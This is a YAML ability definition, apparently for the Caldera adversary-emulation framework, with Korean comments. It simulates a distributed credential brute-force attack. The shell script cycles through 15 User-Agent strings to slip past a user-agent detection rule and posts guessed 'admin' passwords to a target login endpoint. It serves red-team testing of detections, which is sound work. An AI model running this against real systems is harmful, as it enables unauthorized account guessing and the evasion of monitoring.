- id: ee55ff66-aa77-4bb8-cc99-dd0011223344
  name: Distributed Brute Force (UA Rotation)
  description: 15개의 서로 다른 User-Agent로 로그인을 시도하여 Caldera UA 탐지 룰을 우회하고 분산 공격을 시뮬레이션합니다.
  tactic: credential-access
  technique:
    attack_id: T1110.004
    name: Brute Force - Credential Stuffing
  platforms:
    linux:
      sh:
        command: |-
          TARGET="http://#{target.url}"
          OP_ID="#{operation_id}"

          UAS=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
               "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
               "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"
               "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X)"
               "Mozilla/5.0 (Android 14; Mobile; rv:109.0)"
               "curl/8.4.0"
               "python-requests/2.31.0"
               "PostmanRuntime/7.36.0"
               "okhttp/4.12.0"
               "Go-http-client/2.0"
               "axios/1.6.0"
               "wget/1.21.4"
               "HTTPie/3.2.2"
               "insomnia/2023.5.8")

          echo "[*] Distributed Brute Force: 15 different User-Agents"
          # 의도적으로 Caldera 헤더를 빼고 다양한 UA 사용
          for i in $(seq 0 14); do
            UA="${UAS[$i]}"
            echo "  [$((i+1))/15] UA=${UA:0:40}..."
            curl -s -o /dev/null -w "HTTP=%{http_code}\n" \
              -H "Content-Type: application/json" \
              -A "${UA}" \
              -X POST \
              -d "{\"username\":\"admin\",\"password\":\"dist_pass_${i}\"}" \
              "${TARGET}/api/auth/login"
          done
          echo "[*] Distributed brute force complete"
